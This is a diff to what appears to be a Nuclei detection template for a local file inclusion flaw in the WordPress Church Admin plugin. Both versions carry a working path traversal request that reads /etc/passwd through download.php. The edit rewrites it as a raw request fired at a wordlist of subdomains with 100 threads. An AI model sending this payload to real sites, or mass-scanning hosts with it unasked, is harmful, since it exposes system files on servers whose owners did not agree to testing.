@@ -11,10 +11,15 @@ info:
   tags: wordpress,wp-plugin,lfi
 
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd'
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Subdomains}}
     matchers-condition: and
     matchers:
 
